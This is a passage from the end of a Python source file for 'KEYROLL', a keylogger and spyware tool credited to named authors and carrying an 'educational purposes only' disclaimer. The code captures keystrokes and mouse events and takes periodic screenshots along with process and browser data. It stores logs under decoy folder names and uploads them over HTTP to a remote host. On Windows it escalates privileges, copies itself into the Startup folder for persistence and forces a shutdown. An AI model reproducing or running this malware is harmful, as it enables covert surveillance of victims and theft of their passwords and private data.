            if response.status_code == 200:
                print(f'File "{file_name}" sent successfully to {destination_address}:{port}')
                return True
            else:
                print(f'Error during file send. HTTP status code: {response.status_code}')
                return False

        except Exception as e:
            print(f'Error during file send: {e}')
            return False

    @staticmethod
    def sender(file_path):
        """
        Sends the specified file to the remote host using HTTP and renames the file on success.

        Parameters:
        - file_path: The full path of the file to be sent.

        """
        status = Sender.send_file_via_http(destination_address=ARGS.ip_remote_host,
                                           port=ARGS.port_remote_host,
                                           file_path=file_path)

        if status:
            if not os.path.exists(f"{file_path}.old"):
                os.rename(file_path, f"{file_path}.old")
            else:
                os.remove(file_path)


##################################################################
############################## Main ##############################
##################################################################
def main():
    DEFAULT_PATH = os.path.join(os.path.expanduser('~'), 'Desktop')

    signal.signal(signal.SIGINT, Util.sigint_handler)

    parser = argparse.ArgumentParser(
                        prog = 'KEYROLL',
                        formatter_class=CustomDescriptionFormatter,
                      
                        description ="""
    ██ ▄█▀▓█████▓██   ██▓ ██▀███   ▒█████   ██▓     ██▓    
    ██▄█▒ ▓█   ▀ ▒██  ██▒▓██ ▒ ██▒▒██▒  ██▒▓██▒    ▓██▒    
    ▓███▄░ ▒███    ▒██ ██░▓██ ░▄█ ▒▒██░  ██▒▒██░    ▒██░    
    ▓██ █▄ ▒▓█  ▄  ░ ▐██▓░▒██▀▀█▄  ▒██   ██░▒██░    ▒██░    
    ▒██▒ █▄░▒████▒ ░ ██▒▓░░██▓ ▒██▒░ ████▓▒░░██████▒░██████▒
    ▒ ▒▒ ▓▒░░ ▒░ ░  ██▒▒▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▓  ░
    ░ ░▒ ▒░ ░ ░  ░▓██ ░▒░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░░ ░ ▒  ░
    ░ ░░ ░    ░   ▒ ▒ ░░    ░░   ░ ░ ░ ░ ▒    ░ ░     ░ ░   
    ░  ░      ░  ░░ ░        ░         ░ ░      ░  ░    ░  ░
                ░ ░
                        

Please read the disclaimer at the bottom.



                        """,
                        epilog = """
This software and its libraries were developed for educational purposes only and are not intended for malicious use. You are responsible for using the software ethically and legally, in compliance with all applicable laws and regulations.

The authors and contributors of the software decline all responsibility for any loss of data, damage or consequences resulting from the use of the software or libraries connected to it. You understand and agree that your use of the Software is at your own discretion and risk.

The authors and collaborators of the software and the libraries connected to it do not provide any guarantee, explicit or implicit, regarding the quality, reliability or suitability of the software, nor the non-compromise and/or disclosure of personal or private data. You are responsible for conducting all necessary checks and tests before using the software to ensure your safety and the safety of your contacts.

By using the software, you agree to the terms and conditions of this disclaimer. If you disagree with these terms, please refrain from using the software.

Please use the software responsibly and respect the privacy and rights of other users. Once you understand the disclaimer, we wish you a lot of fun.



The authors:
- troclea                   Carioni Federico
- BinxSake                  Torchia Vincenzo


The collaborators
-                           Mazzola Giorgio
- DB02Archery!              Denis Benedetti
                        """)


    parser.add_argument('-V', '-v', '--version', action='version', version='%(prog)s 1.0', help="Show the program's version number and exit.")
    parser.add_argument('-E', '--exit_code', action='store_true', help="Show the program's exit code and exit.\n\n")

    parser.add_argument('-p', '--path', default=DEFAULT_PATH, type=str, help=f"Path to save logs. Default is '{DEFAULT_PATH}'")
    parser.add_argument('-L', '--no-loop', action='store_true', help="The program terminates on the kill command.\n\n")

    parser.add_argument("-I", "--ip-remote-host", default="127.0.0.1", help="IP address to which to send files")
    parser.add_argument("-P", "--port-remote-host", default="4444", type=int, help="Port to which to send files\n\n")

    parser.add_argument('-m', '--no-print-mouse', action="store_true", help='Does not print all mouse events, default is disabled. Like -odes')
    parser.add_argument('-o', '--no-print-mouse-move', action="store_true", help='Does not print mouse move events, default is disabled')
    parser.add_argument('-d', '--no-print-mouse-click-pressed', action="store_true", help='Does not print mouse click pressed events, default is disabled')
    parser.add_argument('-e', '--no-print-mouse-click-relase', action="store_true", help='Does not print mouse click released events, default is disabled')
    parser.add_argument('-s', '--no-print-mouse-scroll', action="store_true", help='Does not print mouse scroll events, default is disabled\n\n')

    parser.add_argument('-k', '--no-print-keyboard', action="store_true", help='Does not print all keyboard events, default is disabled. Like -in')
    parser.add_argument('-i', '--no-print-keyboard-pressed', action="store_true", help='Does not print keyboard key-pressed events, default is disabled')
    parser.add_argument('-n', '--no-print-keyboard-relase', action="store_true", help='Does not print keyboard key-released events, default is disabled')


    global ARGS
    #ARGS = parser.parse_args()

    ARGS, unknown_args = parser.parse_known_args()

    if unknown_args:
        parser.error(f"Command not found: {unknown_args}")

    if ARGS.exit_code:
        data = [
            [0,     'Success'],
            [1,     'General error or abnormal termination'],
            [2,     'Misuse of shell builtins'],
            [126,   'Command invoked cannot execute'],
            [127,   'Command not found'],
            [128,   'Invalid argument to exit'],
            [130,   'Script terminated by Control-C'],
            [260,   'Folder not found']
        ]

        headers = ['Exit Code', 'Meaning']

        table = tabulate(data, headers, tablefmt='grid', colalign=('left', 'left'))
        print(table)

        Util.controlled_exit(0)

    if not Util.is_valid_ip(ARGS.ip_remote_host):
        Log.error(message=f"The provided IP address '{ARGS.ip_remote_host}' in 'ARGS' is not valid.", num=130)



    global LOG_PATH
    LOG_PATH = Util.log_dir_find(def_name_dir_list = ['ByteSync', 'LogicEase', 'PixelFlow', 'CodeCraft', 'SystemLink', 'VistaByte', 'CloudPulse', 'KernelEase', 'OpenLogic', 'DataSync', 'ByteLogic', 'SyncCraft', 'LogicFlow', 'DataCraft', 'CloudLink', 'ByteFlow', 'SystemCraft', 'PixelSync', 'LogicPulse', 'DataLink', 'SyncByte', 'CraftLogic', 'FlowPixel', 'LinkSystem', 'ByteVista', 'PulseCloud', 'EaseKernel', 'LogicOpen', 'SyncData', 'ByteCraft', 'FlowLogic', 'PixelCraft', 'SystemSync', 'LinkData', 'VistaLogic', 'CloudCraft', 'KernelData', 'OpenSync', 'PulseLink', 'UserSync', 'LogicUser', 'DataUser', 'CraftUser', 'SystemUser', 'SyncUser', 'UserByte', 'UserCraft', 'UserLogic', 'UserFlow', 'UserLink', 'UserData', 'UserOpen', 'UserPixel', 'UserPulse', 'UserVista', 'UserKernel', 'UserCloud'], start_dir = os.path.abspath(ARGS.path))

    Log.configure_print_file(LOG_PATH)

    Log.create_message(category = "CONFIG", message = f"args: {ARGS}")
    Log.create_message(category = "CONFIG", message = f"Default path: {DEFAULT_PATH}")
    Log.create_message(category = "CONFIG", message = f"Log path: {LOG_PATH}")

    Trigger.Recursive_interval(60, "Spy.screenshot(LOG_PATH)")
    Trigger.Recursive_interval(60, "Spy.process()")
    Trigger.Recursive_interval(60, "Spy.web()")
    Trigger.Recursive_interval(60, "Spy.screen_size()")

    global spec_w
    spec_w = Trigger.Special_word()

    # spec_w.add_special_word(word = "roll", target = "rickroll.start(audio_file = './roll.wav', no_fullscreen = False, no_keep_on_top = False)")
    spec_w.add_special_word(word = "roll", target = "rickroll.start(no_fullscreen = False, no_keep_on_top = False)")

    Trigger.Over_size(5, 1, "Util.get_log_file()", "Log.configure_print_file(LOG_PATH)")

    Trigger.Over_size(5, 3, LOG_PATH, "Util.log_path_size(LOG_PATH)")


    # Configura i listener
    keyboard_listener = keyboard.Listener(on_press=Keyboard.on_key_press, on_release=Keyboard.on_key_release)
    mouse_listener = mouse.Listener(on_move=Mouse.on_mouse_move, on_click=Mouse.on_mouse_click, on_scroll=Mouse.on_mouse_scroll)

    # Avvia i listener in un thread separato
    keyboard_listener.start()
    mouse_listener.start()

    # Attendi che i listener terminino
    keyboard_listener.join()
    mouse_listener.join()


def pre_main():

    system = platform.system()

    if system == "Windows":

        current_path = os.path.dirname(sys.executable)
        # current_path = os.path.dirname(sys.executable) + os.sep if not os.path.dirname(sys.executable).endswith(os.sep) else os.path.dirname(sys.executable)
        target_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        print(target_path)

        if (current_path != str(target_path)) and getattr(sys, 'frozen', False):

            elevate()
            shutil.move(sys.executable, target_path)
            os.system("shutdown /s /t 1") 

    elif system == "Linux":
        check_and_create_files()


if __name__ == "__main__":
    pre_main()

    main()


    # Delete '__pycache__'
    if os.path.exists('__pycache__'):
        shutil.rmtree('__pycache__')

    if os.path.exists('.pytest_cache'):
        shutil.rmtree('.pytest_cache')





